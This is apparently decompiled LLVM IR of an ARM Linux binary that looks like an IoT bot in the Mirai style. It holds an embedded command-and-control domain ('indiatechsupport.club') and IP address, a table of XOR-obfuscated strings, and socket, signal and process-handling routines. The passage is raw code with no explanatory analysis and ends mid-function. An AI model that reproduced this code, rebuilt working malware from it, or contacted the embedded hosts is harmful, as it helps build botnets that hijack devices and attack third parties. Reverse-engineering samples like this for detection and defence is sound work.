source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%sockaddr = type { i32, [14 x i8] }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%tms = type { i32, i32, i32, i32 }
%timespec = type { i32, i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%linux_dirent64 = type { i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_80a0.1 = constant i32 -352321502
@global_var_1c8f4.5 = global i32 0
@global_var_1c904.6 = global i32* @global_var_1c8f4.5
@global_var_1ca64.12 = global i32 0
@global_var_e248.18 = constant i32 -382906384
@global_var_1ca80.23 = global i32 0
@global_var_8314.24 = constant i32 -352321546
@global_var_12724.25 = constant i32 -481296384
@global_var_a4c4.31 = constant i32 -382906384
@global_var_a988.33 = constant i32 -382906384
@global_var_89d8.35 = constant i32 -382906384
@global_var_c96c.37 = constant i32 -382906384
@global_var_c1f8.39 = constant i32 -382906384
@global_var_b998.41 = constant i32 -382906384
@global_var_9da8.44 = constant i32 -382906384
@global_var_962c.46 = constant i32 -382906384
@global_var_1cb1c.49 = global i32 0
@global_var_14364.61 = constant i32 47
@global_var_1cb24.63 = global i32 0
@global_var_1ca84.65 = global i32 0
@global_var_1cb20.67 = global i32 0
@global_var_e0d0.70 = constant i32 -382910352
@global_var_1c910.72 = global i32 70820
@global_var_1c908.74 = global i32 -1
@global_var_14368.79 = constant [22 x i8] c"indiatechsupport.club\00"
@global_var_14380.83 = constant [15 x i8] c"188.166.125.59\00"
@global_var_1cb2c.84 = local_unnamed_addr global i32 0
@global_var_1cb2b.85 = local_unnamed_addr global i32 0
@global_var_1cb2a.86 = local_unnamed_addr global i32 0
@global_var_1ca88.88 = global i32 0
@global_var_df48.90 = constant i32 -442556408
@global_var_1cb29.94 = local_unnamed_addr global i32 0
@global_var_14390.98 = constant i32 10
@global_var_1c90c.101 = global i32 -1
@global_var_11af0.104 = constant i32 -382910448
@global_var_114a4.105 = constant i32 -382910224
@global_var_14394.107 = constant i32 16777216
@global_var_1ca90.109 = global i32 0
@global_var_1ca9c.111 = global i32 0
@global_var_1ca94.113 = global i32 0
@global_var_1ca98.115 = global i32 0
@global_var_f050.128 = constant i32 -442695668
@global_var_1cad4.130 = global i32 0
@global_var_1caa0.132 = global i32 0
@global_var_1cacc.134 = global i32 0
@global_var_1cb40.139 = global i32 0
@global_var_1cb38.143 = global i32 0
@global_var_1cb3c.145 = global i32 0
@global_var_1caa7.148 = local_unnamed_addr global i32 0
@global_var_1caa6.149 = local_unnamed_addr global i32 0
@global_var_1cab8.151 = global i32 0
@global_var_1caa9.153 = local_unnamed_addr global i32 0
@global_var_1caad.154 = local_unnamed_addr global i32 0
@global_var_1caac.155 = local_unnamed_addr global i32 0
@global_var_1cabb.156 = local_unnamed_addr global i32 0
@global_var_1cab9.157 = local_unnamed_addr global i32 0
@global_var_1caa8.158 = local_unnamed_addr global i32 0
@global_var_1caba.159 = local_unnamed_addr global i32 0
@global_var_1cac7.161 = local_unnamed_addr global i32 0
@global_var_1cac6.162 = local_unnamed_addr global i32 0
@global_var_14420.164 = constant [5 x i8] c"&;; \00"
@global_var_14424.166 = constant i32 536542976
@global_var_1439c.168 = constant [5 x i8] c"5:?;\00"
@global_var_143a4.170 = constant [9 x i8] c"<!: acam\00"
@global_var_143b0.172 = constant [7 x i8] c" 18:1 \00"
@global_var_143b8.174 = constant [8 x i8] c"0125!8 \00"
@global_var_143c0.176 = constant [9 x i8] c"$5''#;&0\00"
@global_var_143cc.178 = constant [6 x i8] c"509=:\00"
@global_var_143d4.180 = constant [6 x i8] c"\22=.,\22\00"
@global_var_143dc.182 = constant [8 x i8] c"'!$$;& \00"
@global_var_143e4.184 = constant i32 423502179
@global_var_143f4.186 = constant [6 x i8] c"efg`a\00"
@global_var_143fc.188 = constant [5 x i8] c"!'1&\00"
@global_var_14404.190 = constant i32 943467547
@global_var_14410.192 = constant i32 322070023
@global_var_1cab0.193 = local_unnamed_addr global i32 0
@global_var_1caae.195 = local_unnamed_addr global i32 0
@global_var_1caaf.196 = local_unnamed_addr global i32 0
@global_var_1cac8.198 = local_unnamed_addr global i32 0
@global_var_1cac9.199 = local_unnamed_addr global i32 0
@global_var_1441c.205 = constant [3 x i8] c"\0D\0A\00"
@global_var_1442e.209 = constant i32 2096127
@global_var_14425.211 = constant i32 2095871
@global_var_1cb48.213 = global i32 0
@global_var_1c918.216 = global i32 -555811921
@global_var_14434.221 = constant [3 x i8] c"Qm\00"
@global_var_1cb50.222 = local_unnamed_addr global i32 0
@global_var_1cb54.223 = local_unnamed_addr global i32 0
@global_var_1cb55.224 = local_unnamed_addr global i32 0
@global_var_14438.226 = constant i32 59987
@global_var_1cb58.227 = local_unnamed_addr global i32 0
@global_var_1cb5c.228 = local_unnamed_addr global i32 0
@global_var_1cb5d.229 = local_unnamed_addr global i32 0
@global_var_145a0.231 = constant i32 808465680
@global_var_1cb64.232 = local_unnamed_addr global i32 0
@global_var_1cb60.233 = local_unnamed_addr global i32 0
@global_var_1cb65.234 = local_unnamed_addr global i32 0
@global_var_1443c.236 = constant [7 x i8] c"'<188T\00"
@global_var_1cb68.237 = local_unnamed_addr global i32 0
@global_var_1cb6c.238 = local_unnamed_addr global i32 0
@global_var_1cb6d.239 = local_unnamed_addr global i32 0
@global_var_14444.241 = constant [8 x i8] c"1:5681T\00"
@global_var_1cb70.242 = local_unnamed_addr global i32 0
@global_var_1cb74.243 = local_unnamed_addr global i32 0
@global_var_1cb75.244 = local_unnamed_addr global i32 0
@global_var_1444c.246 = constant [8 x i8] c"'-' 19T\00"
@global_var_1cb78.247 = local_unnamed_addr global i32 0
@global_var_1cb7c.248 = local_unnamed_addr global i32 0
@global_var_1cb7d.249 = local_unnamed_addr global i32 0
@global_var_14454.251 = constant [4 x i8] c"'<T\00"
@global_var_1cb84.252 = local_unnamed_addr global i32 0
@global_var_1cb80.253 = local_unnamed_addr global i32 0
@global_var_1cb85.254 = local_unnamed_addr global i32 0
@global_var_14458.256 = constant i32 977090171
@global_var_1cb8c.257 = local_unnamed_addr global i32 0
@global_var_1cb88.258 = local_unnamed_addr global i32 0
@global_var_1cb8d.259 = local_unnamed_addr global i32 0
@global_var_1446c.261 = constant i32 470227742
@global_var_1cb94.262 = local_unnamed_addr global i32 0
@global_var_1cb90.263 = local_unnamed_addr global i32 0
@global_var_1cb95.264 = local_unnamed_addr global i32 0
@global_var_14488.266 = constant [10 x i8] c":7;&&17 T\00"
@global_var_1cb9c.267 = local_unnamed_addr global i32 0
@global_var_1cb98.268 = local_unnamed_addr global i32 0
@global_var_1cb9d.269 = local_unnamed_addr global i32 0
@global_var_14494.271 = constant [17 x i8] c"{6=:{6!'-6;,t$'T\00"
@global_var_1cba0.272 = local_unnamed_addr global i32 0
@global_var_1cba4.273 = local_unnamed_addr global i32 0
@global_var_1cba5.274 = local_unnamed_addr global i32 0
@global_var_144a8.276 = constant [23 x i8] c"{6=:{6!'-6;,t?=88tymtT\00"
@global_var_1cbac.277 = local_unnamed_addr global i32 0
@global_var_1cba8.278 = local_unnamed_addr global i32 0
@global_var_1cbad.279 = local_unnamed_addr global i32 0
@global_var_144c0.281 = constant [8 x i8] c"{$&;7{T\00"
@global_var_1cbb0.282 = local_unnamed_addr global i32 0
@global_var_1cbb4.283 = local_unnamed_addr global i32 0
@global_var_1cbb5.284 = local_unnamed_addr global i32 0
@global_var_144c8.286 = constant [6 x i8] c"{1,1T\00"
@global_var_1cbbc.287 = local_unnamed_addr global i32 0
@global_var_1cbb8.288 = local_unnamed_addr global i32 0
@global_var_1cbbd.289 = local_unnamed_addr global i32 0
@global_var_144d0.291 = constant [5 x i8] c"{20T\00"
@global_var_1cbc4.292 = local_unnamed_addr global i32 0
@global_var_1cbc0.293 = local_unnamed_addr global i32 0
@global_var_1cbc5.294 = local_unnamed_addr global i32 0
@global_var_144d8.296 = constant [7 x i8] c"{95$'T\00"
@global_var_1cbc8.297 = local_unnamed_addr global i32 0
@global_var_1cbcc.298 = local_unnamed_addr global i32 0
@global_var_1cbcd.299 = local_unnamed_addr global i32 0
@global_var_144e0.301 = constant [15 x i8] c"{$&;7{:1 { 7$T\00"
@global_var_1cbd0.302 = local_unnamed_addr global i32 0
@global_var_1cbd4.303 = local_unnamed_addr global i32 0
@global_var_1cbd5.304 = local_unnamed_addr global i32 0
@global_var_144f0.306 = constant [9 x i8] c"{' 5 !'T\00"
@global_var_1cc30.307 = local_unnamed_addr global i32 0
@global_var_1cc34.308 = local_unnamed_addr global i32 0
@global_var_1cc35.309 = local_unnamed_addr global i32 0
@global_var_144fc.311 = constant [8 x i8] c"z5:=91T\00"
@global_var_1cc38.312 = local_unnamed_addr global i32 0
@global_var_1cc3c.313 = local_unnamed_addr global i32 0
@global_var_1cc3d.314 = local_unnamed_addr global i32 0
@global_var_14504.316 = constant [17 x i8] c"{$&;7{:1 {&;! 1T\00"
@global_var_1cbd8.317 = local_unnamed_addr global i32 0
@global_var_1cbdc.318 = local_unnamed_addr global i32 0
@global_var_1cbdd.319 = local_unnamed_addr global i32 0
@global_var_14518.321 = constant [9 x i8] c"5''#;&0T\00"
@global_var_1cbe0.322 = local_unnamed_addr global i32 0
@global_var_1cbe4.323 = local_unnamed_addr global i32 0
@global_var_1cbe5.324 = local_unnamed_addr global i32 0
@global_var_145c0.326 = constant i32 557516544
@global_var_1cbec.327 = local_unnamed_addr global i32 0
@global_var_1cbe8.328 = local_unnamed_addr global i32 0
@global_var_1cbed.329 = local_unnamed_addr global i32 0
@global_var_14524.331 = constant [18 x i8] c"{1 7{&1';8\22z7;:2T\00"
@global_var_1cbf4.332 = local_unnamed_addr global i32 0
@global_var_1cbf0.333 = local_unnamed_addr global i32 0
@global_var_1cbf5.334 = local_unnamed_addr global i32 0
@global_var_14538.336 = constant [13 x i8] c":591'1&\221&tT\00"
@global_var_1cbfc.337 = local_unnamed_addr global i32 0
@global_var_1cbf8.338 = local_unnamed_addr global i32 0
@global_var_1cbfd.339 = local_unnamed_addr global i32 0
@global_var_14548.341 = constant [15 x i8] c"{01\22{#5 7<0;3T\00"
@global_var_1cc00.342 = local_unnamed_addr global i32 0
@global_var_1cc04.343 = local_unnamed_addr global i32 0
@global_var_1cc05.344 = local_unnamed_addr global i32 0
@global_var_14558.346 = constant [20 x i8] c"{01\22{9='7{#5 7<0;3T\00"
@global_var_1cc0c.347 = local_unnamed_addr global i32 0
@global_var_1cc08.348 = local_unnamed_addr global i32 0
@global_var_1cc0d.349 = local_unnamed_addr global i32 0
@global_var_1456c.351 = constant [9 x i8] c"$662*7!E\00"
@global_var_1cc10.352 = local_unnamed_addr global i32 0
@global_var_1cc14.353 = local_unnamed_addr global i32 0
@global_var_1cc15.354 = local_unnamed_addr global i32 0
@global_var_14578.356 = constant [6 x i8] c";3=:T\00"
@global_var_1cc1c.357 = local_unnamed_addr global i32 0
@global_var_1cc18.358 = local_unnamed_addr global i32 0
@global_var_1cc1d.359 = local_unnamed_addr global i32 0
@global_var_14580.361 = constant [7 x i8] c"1: 1&T\00"
@global_var_1cc20.362 = local_unnamed_addr global i32 0
@global_var_1cc24.363 = local_unnamed_addr global i32 0
@global_var_1cc25.364 = local_unnamed_addr global i32 0
@global_var_14588.366 = constant [24 x i8] c"e365`70;9ag:<$ef1=d?2>T\00"
@global_var_1cc2d.367 = local_unnamed_addr global i32 0
@global_var_1cc28.368 = local_unnamed_addr global i32 0
@global_var_1cc2c.369 = local_unnamed_addr global i32 0
@global_var_1310c.372 = constant i32 -476053504
@global_var_11ec0.376 = constant i32 -443219956
@global_var_1202c.381 = constant i32 -376111092
@global_var_1cb10.384 = global i32 0
@global_var_121ac.386 = constant i32 -456978431
@global_var_1cc40.388 = global i32 0
@global_var_1cad8.390 = global i32 0
@global_var_1ca18.393 = global i32 256
@global_var_1c91c.394 = global i32* @global_var_1ca18.393
@global_var_1cb00.397 = global i32 0
@global_var_1ccc0.399 = global i32 0
@global_var_138c0.400 = constant i32 -382910416
@global_var_12130.401 = constant i32 -509595648
@global_var_127a4.408 = constant i32 -442564520
@global_var_1ca24.414 = global i32 0
@global_var_11d6c.416 = constant i32 -481230848
@global_var_1caf0.418 = global i32 0
@global_var_13510.420 = constant i32 -509587456
@global_var_146e4.422 = constant i32 33554944
@global_var_1ca5c.423 = global i32* @global_var_146e4.422
@global_var_1ca3c.426 = global i32 0
@global_var_1caf4.430 = local_unnamed_addr global i32 0
@global_var_12ec4.432 = constant i32 -352321419
@global_var_1c8e8.436 = global i32 -1
@global_var_1cb04.439 = global i32 0
@global_var_1cb08.441 = local_unnamed_addr global i32 0
@global_var_130f8.442 = constant i32 -390234096
@global_var_145d8.444 = constant [10 x i8] c"/dev/null\00"
@global_var_1cb0c.446 = global i32 0
@global_var_1caf8.451 = local_unnamed_addr global i32 0
@global_var_1cafc.453 = global i32 0
@global_var_12110.455 = constant i32 -369096958
@global_var_1ca54 = external local_unnamed_addr global i32
@global_var_120c4.465 = constant i32 -442564608
@global_var_133c0.467 = constant i32 -335544664
@global_var_134dc.470 = constant i32 -275775369
@global_var_13c54.471 = constant i32 -382910352
@global_var_1cb18.473 = global i32 0
@global_var_1ccd8.476 = global i32 0
@global_var_1ccdc.478 = global i32 0
@global_var_1c8ec.481 = global i32 0
@global_var_1ca60.3 = external global i8*
@global_var_1ca7c.21 = external global i8*
@global_var_1ca7d.29 = global i8 0
@1 = internal constant [2 x i8] c"\01\00"
@global_var_1c914.76 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_1cb28.81 = external global i8*
@global_var_1ca8c.103 = external global i8*
@global_var_1cad0.136 = external global i8*
@global_var_1cad1.137 = local_unnamed_addr global i8 0
@global_var_1caa4.147 = external global i8*
@global_var_1cac4.152 = local_unnamed_addr global i8 0
@global_var_1cac5.160 = local_unnamed_addr global i8 0
@global_var_1cabc.197 = local_unnamed_addr global i8 0
@global_var_1cab4.194 = local_unnamed_addr global i8 0

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8094() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  %v0_80a0 = call i32 @function_8130()
  store i32 %v0_80a0, i32* @r0, align 4
  %v1_80a4 = call i32 @function_14314(i32 %v0_80a0)
  call void @__pseudo_branch(i32 %v3_8098)
  ret i32 %v1_80a4
}

define i32 @function_80b0() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_1ca60.3 to i32), i32* %r5.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_1ca60.3 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_80c0 = load i32, i32* @r0, align 4
  ret i32 %v12_80c0

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_1c904.6 to i32), i32* %r4.global-to-local, align 4
  %v2_80c8 = load i32, i32* bitcast (i32** @global_var_1c904.6 to i32*), align 4
  store i32 %v2_80c8, i32* %r2.global-to-local, align 4
  %v2_80d0 = icmp eq i32 %v2_80c8, 0
  br i1 %v2_80d0, label %bb8, label %dec_label_pc_80d8

dec_label_pc_80d8:                                ; preds = %bb7, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge
  %v1_80dc = phi i32 [ %v1_80dc.pre, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ ptrtoint (i32** @global_var_1c904.6 to i32), %bb7 ]
  %v0_80d8 = phi i32 [ %v2_80e8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ %v2_80c8, %bb7 ]
  %v1_80d8 = add i32 %v0_80d8, 4
  %v2_80dc = inttoptr i32 %v1_80dc to i32*
  store i32 %v1_80d8, i32* %v2_80dc, align 4
  %v0_80e4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v2_80e8 = load i32, i32* bitcast (i32** @global_var_1c904.6 to i32*), align 4
  store i32 %v2_80e8, i32* %r2.global-to-local, align 4
  %v2_80f0 = icmp eq i32 %v2_80e8, 0
  br i1 %v2_80f0, label %.loopexit, label %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge

dec_label_pc_80d8.dec_label_pc_80d8_crit_edge:    ; preds = %dec_label_pc_80d8
  %v1_80dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_80d8

.loopexit:                                        ; preds = %dec_label_pc_80d8
  %v2_8110.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8110 = phi i32 [ %v2_8110.pre, %.loopexit ], [ ptrtoint (i8** @global_var_1ca60.3 to i32), %bb7 ]
  %v3_8110 = inttoptr i32 %v2_8110 to i8*
  store i8 1, i8* %v3_8110, align 1
  %v2_8114 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8114, i32* %r4.global-to-local, align 4
  %v11_8114 = load i32, i32* @r0, align 4
  ret i32 %v11_8114

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 2, 0 }
  uselistorder i32** @global_var_1c904.6, { 1, 0 }
  uselistorder i8** @global_var_1ca60.3, { 1, 0 }
  uselistorder label %dec_label_pc_80d8, { 1, 0 }
}

define i32 @function_8124(i32 %arg1) local_unnamed_addr {
dec_label_pc_8124:
  %v0_8124 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8124, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_8124
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_8124, %bb
  %v5_812c = load i32, i32* @r0, align 4
  ret i32 %v5_812c

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_8130() local_unnamed_addr {
.thread:
  %v2_8150 = load i32, i32* inttoptr (i32 116984 to i32*), align 8
  %v2_8154 = icmp eq i32 %v2_8150, 0
  br i1 %v2_8154, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 116984

bb2:                                              ; preds = %.thread
  ret i32 116984

; uselistorder directives
  uselistorder i32 116984, { 1, 0, 2 }
}

define i32 @function_8188() local_unnamed_addr {
dec_label_pc_8188:
  %v5_818c = load i32, i32* @r0, align 4
  ret i32 %v5_818c
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8198 = ptrtoint i32* %stack_var_4 to i32
  %v8_81b8 = call i32 @function_131ac(i32 ptrtoint (i32* @global_var_e248.18 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 82768, i32 %arg1, i32 %v4_8198)
  %v0_81bc = call i32 @function_12b74()
  ret i32 %v0_81bc
}

define i32 @function_81cc(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_81cc:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_81cc = urem i32 %arg1, 256
  %v2_81d0 = icmp eq i32 %v1_81cc, 0
  %v1_81d8 = urem i32 %arg3, 256
  br i1 %v2_81d0, label %dec_label_pc_821c, label %dec_label_pc_81e4

dec_label_pc_81e4:                                ; preds = %dec_label_pc_81cc
  %v0_81e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_81e4 = add i32 %v0_81e4, 4
  %v2_81e4 = inttoptr i32 %v1_81e4 to i8*
  %v3_81e4 = load i8, i8* %v2_81e4, align 1
  %v4_81e4 = zext i8 %v3_81e4 to i32
  %v9_81e8 = icmp eq i32 %v4_81e4, %v1_81d8
  br i1 %v9_81e8, label %dec_label_pc_8224, label %dec_label_pc_820c.preheader

dec_label_pc_820c.preheader:                      ; preds = %dec_label_pc_81e4
  br label %dec_label_pc_820c

dec_label_pc_81fc:                                ; preds = %dec_label_pc_820c
  %v1_81fc = add i32 %v0_8204.in, 12
  %v2_81fc = inttoptr i32 %v1_81fc to i8*
  %v3_81fc = load i8, i8* %v2_81fc, align 1
  %v4_81fc = zext i8 %v3_81fc to i32
  %v9_8200 = icmp eq i32 %v4_81fc, %v1_81d8
  br i1 %v9_8200, label %dec_label_pc_8224, label %dec_label_pc_820c

dec_label_pc_820c:                                ; preds = %dec_label_pc_820c.preheader, %dec_label_pc_81fc
  %v0_8204.in = phi i32 [ %v0_81e4, %dec_label_pc_820c.preheader ], [ %v0_8204, %dec_label_pc_81fc ]
  %v0_820c = phi i32 [ 0, %dec_label_pc_820c.preheader ], [ %v1_820c, %dec_label_pc_81fc ]
  %v0_8204 = add i32 %v0_8204.in, 8
  %v1_820c = add i32 %v0_820c, 1
  %v9_8210 = icmp eq i32 %v1_820c, %v1_81cc
  store i32 %v0_8204, i32* %r1.global-to-local, align 4
  br i1 %v9_8210, label %dec_label_pc_821c, label %dec_label_pc_81fc

dec_label_pc_821c:                                ; preds = %dec_label_pc_820c, %dec_label_pc_81cc
  ret i32 %arg4

dec_label_pc_8224:                                ; preds = %dec_label_pc_81fc, %dec_label_pc_81e4
  %v0_8224 = phi i32 [ %v0_81e4, %dec_label_pc_81e4 ], [ %v0_8204, %dec_label_pc_81fc ]
  %v1_8224 = inttoptr i32 %v0_8224 to i32*
  %v2_8224 = load i32, i32* %v1_8224, align 4
  ret i32 %v2_8224

; uselistorder directives
  uselistorder i32 %v1_820c, { 1, 0 }
  uselistorder i32 %v0_8204, { 1, 0, 2 }
  uselistorder i32 %v0_8204.in, { 1, 0 }
  uselistorder i32 %v0_81e4, { 1, 0, 2 }
  uselistorder i32 %v1_81d8, { 1, 0 }
  uselistorder i32 %v1_81cc, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_820c, { 1, 0 }
}

define i32 @function_8230(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_8230:
  store i32 %arg1, i32* @r6, align 4
  %v1_823c = urem i32 %arg2, 256
  store i32 %v1_823c, i32* @r7, align 4
  %v0_8248 = call i32 @function_11b1c()
  %v7_824c = icmp eq i32 %v0_8248, -1
  %tmp23 = icmp slt i32 %v0_8248, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_8230
  br label %bb25

bb24:                                             ; preds = %dec_label_pc_8230
  %. = zext i1 %v7_824c to i32
  store i32 %., i32* @r5, align 4
  %v2_8264 = icmp eq i1 %v7_824c, false
  br i1 %v2_8264, label %bb26, label %bb25

bb25:                                             ; preds = %.thread2, %bb24
  ret i32 %v0_8248

bb26:                                             ; preds = %bb24
  %v0_826c = call i32 @function_11b1c()
  %v7_8270 = icmp eq i32 %v0_826c, -1
  store i32 %v0_826c, i32* @r4, align 4
  br i1 %v7_8270, label %dec_label_pc_82a0, label %dec_label_pc_827c

dec_label_pc_827c:                                ; preds = %bb26
  %v2_827c = icmp eq i32 %v0_826c, 0
  br i1 %v2_827c, label %dec_label_pc_8284, label %dec_label_pc_82a8

dec_label_pc_8284:                                ; preds = %dec_label_pc_827c
  %v0_8284 = load i32, i32* @r6, align 4
  %v1_8288 = call i32 @function_12efc(i32 %v0_8284)
  %v0_828c = call i32 @function_11b74()
  %v2_8294 = call i32 @function_11bf0(i32 %v0_828c, i32 9)
  %v0_8298 = load i32, i32* @r4, align 4
  %v1_829c = call i32 @function_12e68(i32 %v0_8298)
  br label %dec_label_pc_82a0

dec_label_pc_82a0:                                ; preds = %bb26, %dec_label_pc_8284
  %v0_82a0 = load i32, i32* @r5, align 4
  %v1_82a4 = call i32 @function_12e68(i32 %v0_82a0)
  br label %dec_label_pc_82a8

dec_label_pc_82a8:                                ; preds = %dec_label_pc_827c, %dec_label_pc_82a0
  %v2_82ac = load i8, i8* bitcast (i8** @global_var_1ca7c.21 to i8*), align 4
  %v3_82ac = zext i8 %v2_82ac to i32
  %v2_82b0 = icmp eq i8 %v2_82ac, 0
  br i1 %v2_82b0, label %dec_label_pc_82f4, label %dec_label_pc_82b8

dec_label_pc_82b8:                                ; preds = %dec_label_pc_82a8
  %v2_82bc = load i32, i32* @global_var_1ca80.23, align 4
  %v1_82c0 = inttoptr i32 %v2_82bc to i32*
  %v2_82c0 = load i32, i32* %v1_82c0, align 4
  store i32 %v2_82c0, i32* @ip, align 4
  %v1_82c4 = add i32 %v2_82c0, 4
  %v2_82c4 = inttoptr i32 %v1_82c4 to i8*
  %v3_82c4 = load i8, i8* %v2_82c4, align 1
  %v4_82c4 = zext i8 %v3_82c4 to i32
  %v1_82c8 = load i32, i32* @r7, align 4
  %v9_82c8 = icmp eq i32 %v4_82c4, %v1_82c8
  br i1 %v9_82c8, label %dec_label_pc_82fc, label %dec_label_pc_82e8.preheader

dec_label_pc_82e8.preheader:                      ; preds = %dec_label_pc_82b8
  %v1_82cc = load i32, i32* @r5, align 4
  br label %dec_label_pc_82e8

dec_label_pc_82d8:                                ; preds = %dec_label_pc_82e8
  %v4_82d8 = mul i32 %v1_82e8, 4
  %v5_82d8 = add i32 %v4_82d8, %v2_82bc
  %v6_82d8 = inttoptr i32 %v5_82d8 to i32*
  %v7_82d8 = load i32, i32* %v6_82d8, align 4
  store i32 %v7_82d8, i32* @ip, align 4
  %v1_82dc = add i32 %v7_82d8, 4
  %v2_82dc = inttoptr i32 %v1_82dc to i8*
  %v3_82dc = load i8, i8* %v2_82dc, align 1
  %v4_82dc = zext i8 %v3_82dc to i32
  %v9_82e0 = icmp eq i32 %v4_82dc, %v1_82c8
  br i1 %v9_82e0, label %dec_label_pc_82fc, label %dec_label_pc_82e8

dec_label_pc_82e8:                                ; preds = %dec_label_pc_82e8.preheader, %dec_label_pc_82d8
  %v0_82e8 = phi i32 [ %v1_82cc, %dec_label_pc_82e8.preheader ], [ %v1_82e8, %dec_label_pc_82d8 ]
  %v1_82e8 = add i32 %v0_82e8, 1
  %v9_82ec = icmp eq i32 %v1_82e8, %v3_82ac
  br i1 %v9_82ec, label %dec_label_pc_82f4, label %dec_label_pc_82d8

dec_label_pc_82f4:                                ; preds = %dec_label_pc_82e8, %dec_label_pc_82a8, %dec_label_pc_82fc
  %v1_82f8 = call i32 @function_12e68(i32 0)
  %v0_8310.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_82fc

dec_label_pc_82fc:                                ; preds = %dec_label_pc_82d8, %dec_label_pc_82b8, %dec_label_pc_82f4
  %v0_8310 = phi i32 [ %v2_82c0, %dec_label_pc_82b8 ], [ %v0_8310.pre, %dec_label_pc_82f4 ], [ %v7_82d8, %dec_label_pc_82d8 ]
  %v1_8310 = inttoptr i32 %v0_8310 to i32*
  %v2_8310 = load i32, i32* %v1_8310, align 4
  call void @__pseudo_branch(i32 %v2_8310)
  br label %dec_label_pc_82f4

; uselistorder directives
  uselistorder i32 %v1_82e8, { 2, 0, 1 }
  uselistorder i32 %v0_826c, { 1, 2, 0 }
  uselistorder i1 %v7_824c, { 1, 0 }
  uselistorder i32 %v0_8248, { 2, 1, 0 }
  uselistorder label %dec_label_pc_82fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82e8, { 1, 0 }
  uselistorder label %dec_label_pc_82a8, { 1, 0 }
  uselistorder label %dec_label_pc_82a0, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
}

define i32 @function_8320(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8320:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_8320 = load i32, i32* @r4, align 4
  %v6_8320 = load i32, i32* @r5, align 4
  %v9_8320 = load i32, i32* @r6, align 4
  %v12_8320 = load i32, i32* @r7, align 4
  %v15_8320 = load i32, i32* @r8, align 4
  %v18_8320 = load i32, i32* @sb, align 4
  %v21_8320 = load i32, i32* @sl, align 4
  %v27_8320 = load i32, i32* @lr, align 4
  %v7_8324 = icmp eq i32 %arg2, 3
  store i1 %v7_8324, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r5, align 4
  %v0_8330 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_8330, i32* @r4, align 4
  %tmp33 = icmp ult i32 %arg2, 4
